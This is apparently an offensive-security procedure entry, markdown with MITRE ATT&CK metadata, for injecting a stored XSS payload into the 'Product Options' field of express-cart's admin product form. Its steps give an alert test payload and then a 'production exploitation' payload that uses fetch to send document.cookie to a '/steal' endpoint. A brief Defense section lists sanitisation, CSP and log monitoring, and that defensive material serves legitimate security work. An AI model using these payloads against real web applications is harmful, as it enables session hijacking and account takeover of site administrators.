---
id: proc-uuid-003
tags:
  - xss-injection
  - payload
  - javascript
type: procedure
tools:
  - '[[tools/Google-Chrome]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.268Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-Product-Options

## Summary

This procedure involves entering a malicious JavaScript payload into the 'Product Options' field of the express-cart product creation form, exploiting the lack of input sanitization.

## Description

The vulnerability stems from the express-cart module not escaping or sanitizing user input in the 'Product Options' field during admin product creation. By inserting HTML/JavaScript like `<script>alert(1234)</script>`, the payload is stored and reflected back into the browser without encoding, allowing execution in the admin's context. This can lead to arbitrary code running, such as stealing session cookies via `document.cookie`. The procedure targets the Node.js/Express-based web app and requires an open product creation form.

## Requirements

1. Access to the product creation form with 'Product Options' field visible
2. Knowledge of basic JavaScript payloads for testing
3. Browser developer tools for payload verification if needed

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs using libraries like DOMPurify or escape outputs with HTML entities
- Implement Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous input patterns in logs, such as script tags

## Objectives

1. Insert unsanitized JavaScript into the form field
2. Ensure payload is accepted without rejection
3. Prepare for reflection and execution

## Instructions

### Step 1: Locate Product Options Field

**Context**: Identify the vulnerable input area in the form.

Scroll to the 'Product Options' details section in the product creation form.

> The field is a text input or textarea for entering options.

### Step 2: Enter Malicious Payload

**Context**: Input the XSS payload to test reflection.

Type `<script>alert(1234)</script>` into the 'Product Options' field.

> For production exploitation, use payloads like `<script>fetch('/steal?cookie='+document.cookie)</script>` to exfiltrate data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Google-Chrome]]

## Tags

- xss-payload
- injection
- product-options
